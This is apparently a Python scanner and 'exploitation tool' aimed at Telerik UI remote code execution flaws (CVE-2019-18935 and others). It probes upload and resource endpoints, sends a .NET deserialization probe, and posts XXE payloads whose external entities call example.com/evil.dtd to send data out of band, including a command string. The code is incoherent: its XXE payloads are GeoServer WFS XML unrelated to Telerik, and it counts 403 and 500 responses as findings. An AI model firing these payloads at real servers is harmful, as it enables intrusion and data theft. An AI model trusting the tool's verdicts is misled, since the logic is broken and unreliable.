import requests
import sys
import ssl
import base64
import json
import re
import argparse
import time
from urllib.parse import urljoin, quote
from datetime import datetime

# 禁用SSL警告（用于自签名证书等情况）
requests.packages.urllib3.disable_warnings()

class TelerikRCEVulnerabilityTester:
    def __init__(self, base_url, timeout=30, verbose=False, output_file=None):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        })
        # 禁用SSL验证（处理自签名证书）
        self.session.verify = False
        self.test_results = {
            'target': self.base_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': []
        }
        
    def log(self, message, level="INFO"):
        """记录日志信息"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        print(log_message)
        
        if self.output_file:
            with open(self.output_file, 'a', encoding='utf-8') as f:
                f.write(log_message + '\n')
    
    def test_vulnerability(self, test_types=None):
        """
        测试Telerik UI远程代码执行漏洞
        :param test_types: 要执行的测试类型列表，None表示执行所有测试
        """
        if test_types is None:
            test_types = ['detection', 'async_upload', 'serialization', 'file_upload', 'exploit']
        
        self.log(f"开始测试目标: {self.base_url}")
        self.log(f"漏洞名称: Progress Telerik UI 远程代码执行漏洞")
        self.log(f"CVE编号: CVE-2019-18935, CVE-2017-11317, CVE-2017-11357")
        self.log(f"影响版本: 2007.2.607.0 - 2019.3.1023.0")
        
        # 检测Telerik UI是否存在
        if 'detection' in test_types:
            self.log("\n" + "=" * 50)
            self.log("阶段1: 检测Telerik UI组件")
            self.log("=" * 50)
            telerik_detected = self.detect_telerik_ui()
            self.test_results['telerik_detected'] = telerik_detected
            
            if not telerik_detected:
                self.log("未检测到Telerik UI组件，目标可能不受影响")
                return False
        
        # 测试RadAsyncUpload组件是否存在
        if 'async_upload' in test_types:
            self.log("\n" + "=" * 50)
            self.log("阶段2: 检测RadAsyncUpload组件")
            self.log("=" * 50)
            async_upload_detected = self.test_async_upload_component()
            self.test_results['async_upload_detected'] = async_upload_detected
        
        # 测试序列化漏洞
        if 'serialization' in test_types:
            self.log("\n" + "=" * 50)
            self.log("阶段3: 测试序列化漏洞")
            self.log("=" * 50)
            serialization_vuln = self.test_serialization_vulnerability()
            self.test_results['serialization_vuln'] = serialization_vuln
        
        # 测试文件上传漏洞
        if 'file_upload' in test_types:
            self.log("\n" + "=" * 50)
            self.log("阶段4: 测试文件上传漏洞")
            self.log("=" * 50)
            upload_vuln = self.test_file_upload_vulnerability()
            self.test_results['upload_vuln'] = upload_vuln
        
        # 尝试漏洞利用
        if 'exploit' in test_types:
            self.log("\n" + "=" * 50)
            self.log("阶段5: 漏洞利用测试")
            self.log("=" * 50)
            exploit_result = self.test_exploit_vulnerability()
            self.test_results['exploit_result'] = exploit_result
        
        # 显示详细测试结果
        self.log("\n" + "=" * 50)
        self.log("测试结果汇总")
        self.log("=" * 50)
        self.log(f"Telerik UI组件检测: {'成功' if self.test_results.get('telerik_detected') else '失败'}")
        self.log(f"RadAsyncUpload组件检测: {'成功' if self.test_results.get('async_upload_detected') else '失败'}")
        self.log(f"序列化漏洞测试: {'发现迹象' if self.test_results.get('serialization_vuln') else '未发现'}")
        self.log(f"文件上传功能测试: {'可用' if self.test_results.get('upload_vuln') else '不可用'}")
        
        # 综合判断漏洞存在性
        if (self.test_results.get('async_upload_detected') and 
            (self.test_results.get('serialization_vuln') or self.test_results.get('upload_vuln'))):
            self.log("\n高危: 目标可能存在Telerik UI远程代码执行漏洞!")
            self.log("建议立即进行安全加固和漏洞修复")
            self.test_results['vulnerabilities'].append({
                'type': 'Telerik_RCE',
                'severity': '高危',
                'description': 'Telerik UI远程代码执行漏洞',
                'cve': ['CVE-2019-18935', 'CVE-2017-11317', 'CVE-2017-11357']
            })
            return True
        elif self.test_results.get('async_upload_detected'):
            self.log("\n警告: 检测到RadAsyncUpload组件，但未确认漏洞存在")
            self.log("建议进行更深入的安全测试")
            return False
        else:
            self.log("\n安全: 目标可能不存在该漏洞或已修复")
            return False
    
    def custom_test(self, test_type, payload=None, headers=None, method='GET'):
        """
        自定义测试功能
        :param test_type: 测试类型 (dns, http, command, custom)
        :param payload: 自定义payload
        :param headers: 自定义请求头
        :param method: HTTP方法 (GET, POST)
        """
        self.log(f"\n开始自定义测试: {test_type}")
        
        if test_type == 'dns':
            return self.test_dns_exfiltration()
        elif test_type == 'http':
            return self.test_http_exfiltration()
        elif test_type == 'command':
            return self.test_command_execution()
        elif test_type == 'custom':
            return self.test_custom_payload(payload, headers, method)
        else:
            self.log(f"不支持的测试类型: {test_type}")
            return False
    
    def test_dns_exfiltration(self, domain="example.com"):
        """测试DNS外带数据"""
        self.log(f"测试DNS外带数据到: {domain}")
        
        payload = f'''<wfs:GetFeature service="WFS" version="1.0.0"
xmlns:topp="http://www.openplans.org/topp"
xmlns:wfs="http://www.opengis.net/wfs"
xmlns:ogc="http://www.opengis.net/ogc"
xmlns:gml="http://www.opengis.net/gml"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://stooceax/wfs http://{domain}/test.xsd">
<wfs:Query typeName="topp:states">
</wfs:Query>
</wfs:GetFeature>'''
        
        return self.send_custom_request(payload)
    
    def test_http_exfiltration(self, url="http://example.com/evil.dtd"):
        """测试HTTP外带数据"""
        self.log(f"测试HTTP外带数据到: {url}")
        
        payload = f'''<!DOCTYPE xmlrootname [
<!ENTITY % remote SYSTEM "{url}">
%remote;
]>
<wfs:GetFeature service="WFS" version="1.0.0"
xmlns:topp="http://www.openplans.org/topp"
xmlns:wfs="http://www.opengis.net/wfs"
xmlns:ogc="http://www.opengis.net/ogc"
xmlns:gml="http://www.opengis.net/gml"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<wfs:Query typeName="topp:states">
</wfs:Query>
</wfs:GetFeature>'''
        
        return self.send_custom_request(payload)
    
    def test_command_execution(self, command="whoami"):
        """测试命令执行"""
        self.log(f"测试命令执行: {command}")
        
        # 注意：这是一个示例payload，实际利用需要根据目标环境调整
        encoded_command = quote(command)
        payload = f'''<!DOCTYPE xmlrootname [
<!ENTITY % remote SYSTEM "http://example.com/evil.dtd">
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://example.com/?cmd={encoded_command}'>">
%remote;
]>
<wfs:GetFeature service="WFS" version="1.0.0"
xmlns:topp="http://www.openplans.org/topp"
xmlns:wfs="http://www.opengis.net/wfs"
xmlns:ogc="http://www.opengis.net/ogc"
xmlns:gml="http://www.opengis.net/gml"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<wfs:Query typeName="topp:states">
</wfs:Query>
</wfs:GetFeature>'''
        
        return self.send_custom_request(payload)
    
    def test_custom_payload(self, payload, headers=None, method='POST'):
        """测试自定义payload"""
        self.log("测试自定义payload")
        
        if headers is None:
            headers = {
                'Content-Type': 'application/xml',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        
        return self.send_custom_request(payload, headers, method)
    
    def send_custom_request(self, payload, headers=None, method='POST'):
        """发送自定义请求"""
        target_urls = [
            "/Telerik.Web.UI.WebResource.axd",
            "/WebResource.axd",
            "/Telerik.Web.UI.AsyncUploadHandler.axd"
        ]
        
        for target_path in target_urls:
            try:
                url = urljoin(self.base_url, target_path)
                self.log(f"测试目标: {url}")
                
                if headers is None:
                    headers = {
                        'Content-Type': 'application/xml',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                
                if method.upper() == 'POST':
                    response = self.session.post(
                        url, 
                        data=payload, 
                        headers=headers, 
                        timeout=self.timeout,
                        verify=False
                    )
                else:
                    response = self.session.get(
                        url, 
                        headers=headers, 
                        timeout=self.timeout,
                        verify=False
                    )
                
                self.log(f"响应状态码: {response.status_code}")
                self.log(f"响应长度: {len(response.content)}字节")
                
                if self.verbose:
                    if len(response.text) < 500:
                        self.log(f"响应内容:\n{response.text}")
                    else:
                        self.log(f"响应内容过长，已截断:\n{response.text[:500]}...")
                
                # 分析响应
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if "success" in content_lower or "upload" in content_lower:
                        self.log("请求成功，检测到相关特征")
                        return True
                    else:
                        self.log("请求成功，但未检测到预期特征")
                        return False
                elif response.status_code in [403, 500]:
                    self.log(f"服务器返回异常状态码: {response.status_code}")
                    self.log(f"响应内容: {response.text[:200]}...")
                    return True
                else:
                    self.log(f"请求完成，状态码: {response.status_code}")
                    return False
                    
            except requests.exceptions.RequestException as e:
                self.log(f"请求失败: {e}")
                continue
        
        return False
    
    def test_exploit_vulnerability(self):
        """测试漏洞利用"""
        self.log("尝试漏洞利用测试...")
        
        # 测试DNS外带
        dns_result = self.test_dns_exfiltration()
        self.log(f"DNS外带测试: {'成功' if dns_result else '失败'}")
        
        # 测试HTTP外带
        http_result = self.test_http_exfiltration()
        self.log(f"HTTP外带测试: {'成功' if http_result else '失败'}")
        
        # 测试命令执行
        cmd_result = self.test_command_execution("whoami")
        self.log(f"命令执行测试: {'成功' if cmd_result else '失败'}")
        
        return dns_result or http_result or cmd_result
    
    def detect_telerik_ui(self):
        """
        检测目标是否使用Telerik UI组件
        """
        self.log("正在检测Telerik UI组件...")
        self.log("检查常见Telerik UI路径:")
        
        # 常见的Telerik UI相关路径
        telerik_paths = [
            "/Telerik.Web.UI.WebResource.axd",
            "/WebResource.axd",
            "/ScriptResource.axd",
            "/Telerik.Web.UI.DialogHandler.aspx",
            "/Telerik.Web.UI.SpellCheckHandler.axd",
            "/Telerik.Web.UI.AsyncUploadHandler.axd"
        ]
        
        detected = False
        detected_path = None
        
        for i, path in enumerate(telerik_paths, 1):
            try:
                url = urljoin(self.base_url, path)
                self.log(f"   {i}. 测试: {url}")
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    # 检查Telerik特有的响应头或内容
                    if "Telerik" in response.text or "Rad" in response.text:
                        self.log(f"      发现Telerik UI组件! (状态码: {response.status_code})")
                        detected = True
                        detected_path = path
                        break
                    else:
                        self.log(f"       路径存在但未检测到Telerik特征 (状态码: {response.status_code})")
                else:
                    self.log(f"       路径不存在 (状态码: {response.status_code})")
                        
            except requests.exceptions.RequestException as e:
                self.log(f"       请求失败: {e}")
                continue
                
        if detected:
            self.log(f"检测结果: 发现Telerik UI组件 - {detected_path}")
        else:
            self.log("检测结果: 未检测到Telerik UI组件")
            
        return detected
    
    def test_async_upload_component(self):
        """
        测试RadAsyncUpload组件是否存在
        """
        self.log("正在检测RadAsyncUpload组件...")
        
        test_urls = [
            "/Telerik.Web.UI.WebResource.axd?type=rau",
            "/WebResource.axd?type=rau", 
            "/Telerik.Web.UI.AsyncUploadHandler.axd"
        ]
        
        detected = False
        
        for i, url_path in enumerate(test_urls, 1):
            try:
                url = urljoin(self.base_url, url_path)
                self.log(f"   {i}. 测试: {url}")
                response = self.session.get(url, timeout=self.timeout)
                
                self.log(f"      状态码: {response.status_code}")
                self.log(f"      响应长度: {len(response.content)}字节")
                
                # 检查RadAsyncUpload组件响应
                if response.status_code == 200:
                    content = response.text.lower()
                    if "radasyncupload" in content:
                        self.log("       明确检测到RadAsyncUpload组件!")
                        detected = True
                        break
                    elif "rad" in content:
                        self.log("       检测到Rad相关组件，可能是RadAsyncUpload")
                        detected = True
                        break
                    else:
                        self.log("      响应正常但未检测到RadAsyncUpload特征")
                elif response.status_code == 404:
                    self.log("      路径不存在 (404)")
                elif response.status_code == 403:
                    self.log("       访问被拒绝 (403) - 组件可能存在但受保护")
                else:
                    self.log(f"       异常响应: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                self.log(f"      请求失败: {e}")
                continue
        
        if detected:
            self.log("检测结果: RadAsyncUpload组件存在")
        else:
            self.log("检测结果: 未检测到RadAsyncUpload组件")
            
        return detected
    
    def test_serialization_vulnerability(self):
        """
        测试.NET序列化漏洞
        """
        self.log("正在测试.NET序列化漏洞...")
        
        test_targets = [
            "/Telerik.Web.UI.WebResource.axd",
            "/WebResource.axd",
            "/Telerik.Web.UI.DialogHandler.aspx"
        ]
        
        detected = False
        
        for i, target_path in enumerate(test_targets, 1):
            try:
                url = urljoin(self.base_url, target_path)
                self.log(f"   {i}. 测试目标: {url}")
                
                # 构造一个简单的序列化payload进行探测
                payload = {
                    "TypeName": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
                    "Assembly": "test"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                
                self.log("      发送序列化测试payload...")
                response = self.session.post(url, json=payload, headers=headers, timeout=self.timeout)
                
                self.log(f"      响应状态码: {response.status_code}")
                self.log(f"      响应长度: {len(response.content)}字节")
                
                # 检查是否存在序列化相关的错误响应
                if response.status_code == 500:
                    error_content = response.text.lower()
                    if "serialization" in error_content:
                        self.log("       检测到序列化错误!")
                        self.log(f"      错误信息: {response.text[:100]}...")
                        detected = True
                        break
                    elif "type" in error_content or "assembly" in error_content:
                        self.log("       检测到类型相关错误，可能是序列化漏洞")
                        self.log(f"      错误信息: {response.text[:100]}...")
                        detected = True
                        break
                    else:
                        self.log("       服务器错误，但与序列化无关")
                        
                elif response.status_code == 400:
                    self.log("      请求错误 (400) - 可能触发了某种验证")
                    detected = True
                    break
                    
                elif response.status_code == 200:
                    self.log("       请求成功，未触发序列化错误")
                    
                else:
                    self.log(f"      异常响应: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                self.log(f"      请求失败: {e}")
                continue
        
        if detected:
            self.log("检测结果: 发现序列化漏洞迹象")
        else:
            self.log("检测结果: 未发现序列化漏洞迹象")
            
        return detected
    
    def test_file_upload_vulnerability(self):
        """
        测试文件上传漏洞
        """
        self.log("正在测试文件上传功能...")
        
        upload_targets = [
            "/Telerik.Web.UI.WebResource.axd?type=rau",
            "/WebResource.axd?type=rau",
            "/Telerik.Web.UI.AsyncUploadHandler.axd"
        ]
        
        detected = False
        
        for i, target_path in enumerate(upload_targets, 1):
            try:
                upload_url = urljoin(self.base_url, target_path)
                self.log(f"   {i}. 测试上传端点: {upload_url}")
                
                # 构造一个简单的文件上传请求
                boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
                headers = {
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                # 简单的测试文件内容
                file_content = "test file content for vulnerability detection - " + "A" * 50
                
                body = f"""--{boundary}
Content-Disposition: form-data; name="file"; filename="test_upload.txt"
Content-Type: text/plain

{file_content}
--{boundary}--"""
                
                self.log("      发送文件上传测试请求...")
                response = self.session.post(upload_url, data=body, headers=headers, timeout=self.timeout)
                
                self.log(f"      响应状态码: {response.status_code}")
                self.log(f"      响应长度: {len(response.content)}字节")
                
                # 分析响应
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    if "success" in content_lower:
                        self.log("      文件上传成功!")
                        detected = True
                        break
                    elif "error" in content_lower:
                        self.log("        上传功能存在但返回错误")
                        self.log(f"      错误信息: {response.text[:100]}...")
                        detected = True
                        break
                    elif "upload" in content_lower:
                        self.log("        检测到上传相关响应")
                        detected = True
                        break
                    else:
                        self.log("      响应正常但未检测到上传相关特征")
                        
                elif response.status_code == 403:
                    self.log("       访问被拒绝 (403) - 上传功能可能存在但受保护")
                    detected = True
                    break
                    
                elif response.status_code == 404:
                    self.log("       上传端点不存在 (404)")
                    
                elif response.status_code == 500:
                    self.log("       服务器错误 (500) - 可能触发了上传处理逻辑")
                    self.log(f"      错误信息: {response.text[:100]}...")
                    detected = True
                    break
                    
                else:
                    self.log(f"       异常响应: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                self.log(f"      请求失败: {e}")
                continue
        
        if detected:
            self.log("检测结果: 文件上传功能存在")
        else:
            self.log("检测结果: 未检测到文件上传功能")
            
        return detected

def main():
    parser = argparse.ArgumentParser(description="Telerik UI RCE漏洞扫描与利用工具")
    parser.add_argument("-u", "--url", required=True, help="目标URL")
    parser.add_argument("-t", "--test-type", choices=["all", "detection", "async_upload", "serialization", "file_upload", "exploit"], 
                        default="all", help="测试类型 (默认: all)")
    parser.add_argument("-c", "--custom-test", choices=["dns", "http", "command", "custom"], 
                        help="自定义测试类型")
    parser.add_argument("-p", "--payload", help="自定义payload (用于custom测试)")
    parser.add_argument("-d", "--dns-domain", default="example.com", help="DNS外带域名")
    parser.add_argument("-http", "--http-url", default="http://example.com/evil.dtd", help="HTTP外带URL")
    parser.add_argument("-cmd", "--command", default="whoami", help="要执行的命令")
    parser.add_argument("-o", "--output", help="输出结果到文件")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细模式")
    parser.add_argument("-to", "--timeout", type=int, default=30, help="请求超时时间(秒)")
    
    args = parser.parse_args()
    
    # 处理SSL上下文（可选）
    ssl._create_default_https_context = ssl._create_unverified_context
    
    print("=" * 80)
    print("Telerik UI RCE Vulnerability Scanner & Exploitation Tool")
    print("=" * 80)
    print(f"目标: {args.url}")
    print(f"测试类型: {args.test_type}")
    print(f"超时: {args.timeout}秒")
    if args.output:
        print(f"输出文件: {args.output}")
    print("=" * 80)
    
    tester = TelerikRCEVulnerabilityTester(
        args.url, 
        timeout=args.timeout, 
        verbose=args.verbose,
        output_file=args.output
    )
    
    # 执行自定义测试或标准测试
    if args.custom_test:
        if args.custom_test == "dns":
            result = tester.test_dns_exfiltration(args.dns_domain)
        elif args.custom_test == "http":
            result = tester.test_http_exfiltration(args.http_url)
        elif args.custom_test == "command":
            result = tester.test_command_execution(args.command)
        elif args.custom_test == "custom":
            if not args.payload:
                print("错误: 自定义测试需要指定payload参数")
                sys.exit(1)
            result = tester.test_custom_payload(args.payload)
    else:
        # 执行标准测试
        test_types = None
        if args.test_type != "all":
            test_types = [args.test_type]
        
        result = tester.test_vulnerability(test_types)
    
    # 保存测试结果
    if args.output:
        with open(args.output, 'a', encoding='utf-8') as f:
            f.write("\n" + "=" * 80 + "\n")
            f.write("测试结果汇总:\n")
            f.write(json.dumps(tester.test_results, indent=2, ensure_ascii=False))
            f.write("\n" + "=" * 80 + "\n")
    
    print("\n" + "=" * 80)
    if result:
        print("[!] 高危: 检测到潜在安全风险!")
        print("[!] 建议立即进行安全加固和漏洞修复")
        print("[!] 请查看详细测试结果获取更多信息")
    else:
        print("[✓] 安全: 未检测到明显的漏洞迹象")
    print("=" * 80)
    
    # 显示测试结果摘要
    if tester.test_results.get('vulnerabilities'):
        print("\n发现的漏洞:")
        for vuln in tester.test_results['vulnerabilities']:
            print(f"  - {vuln['type']}: {vuln['severity']} - {vuln['description']}")

if __name__ == "__main__":
    main()
